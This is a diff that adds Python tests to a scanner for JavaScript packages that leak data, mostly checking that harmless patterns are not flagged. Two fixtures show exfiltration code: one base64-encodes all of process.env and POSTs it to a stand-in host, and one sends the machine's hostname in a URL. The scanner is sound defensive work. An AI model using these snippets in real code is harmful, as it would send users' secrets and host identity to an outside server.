@@ -50,3 +50,62 @@ class TestJavaScriptLeak:
             "const req = mod.request(opts, () => {});\nreq.write(data);\n"
         )
         assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["environment"]
+
+
+class TestWhatIsNotSent:
+    """Each shape was a false block in a random sample of 15,000 published packages."""
+
+    def test_a_callback_body_is_not_what_a_request_sends(self) -> None:
+        text = (
+            "const os = require('os');\nconst who = os.hostname();\n"
+            "https.get(url, (res) => { log(who); res.resume(); });\n"
+        )
+        assert JavaScriptLeak.findings(text) == []
+
+    def test_a_child_processs_environment_is_not_a_request(self) -> None:
+        text = (
+            "const env = Object.assign({}, process.env, { CI: '1' });\n"
+            "const res = spawnSync('bash', args, { env, stdio: 'inherit' });\n"
+            "fetch(url, { method: 'POST', body: JSON.stringify(res.status) });\n"
+        )
+        assert JavaScriptLeak.findings(text) == []
+
+    def test_one_named_variable_does_not_borrow_the_name_env(self) -> None:
+        text = (
+            "const env = { ...process.env };\nconst base = process.env.REGISTRY_URL || 'https://r.invalid';\n"
+            "https.get(base + '/latest');\n"
+        )
+        assert JavaScriptLeak.findings(text) == []
+
+    def test_a_word_in_a_string_is_not_a_variable(self) -> None:
+        text = (
+            "const debug = process.env;\nconst name = cfg.func ?? 'debug';\n"
+            "fetch(`https://r.invalid/${encodeURIComponent(name)}`);\n"
+        )
+        assert JavaScriptLeak.findings(text) == []
+
+    def test_checking_the_environment_exists_is_not_sending_it(self) -> None:
+        text = (
+            "const debug = typeof process === 'object' && process.env && process.env.NODE_DEBUG;\n"
+            "fetch(url, { body: String(debug) });\n"
+        )
+        assert JavaScriptLeak.findings(text) == []
+
+    def test_a_path_under_home_is_not_the_users_identity(self) -> None:
+        text = (
+            "const configPath = path.join(os.homedir(), '.tool', 'config');\n"
+            "const content = fs.readFileSync(configPath, 'utf-8');\n"
+            "fetch(api, { method: 'POST', body: JSON.stringify({ email }) });\n"
+        )
+        assert JavaScriptLeak.findings(text) == []
+
+    def test_the_environment_serialised_into_a_request_is_still_found(self) -> None:
+        text = (
+            "const payload = Buffer.from(JSON.stringify(process.env)).toString('base64');\n"
+            "fetch('https://c.invalid/x', { method: 'POST', body: payload });\n"
+        )
+        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["environment"]
+
+    def test_the_hostname_in_a_template_url_is_still_found(self) -> None:
+        text = "https.get(`https://c.invalid/p?h=${os.hostname()}`);\n"
+        assert [kind for _, kind in JavaScriptLeak.findings(text)] == ["identity"]
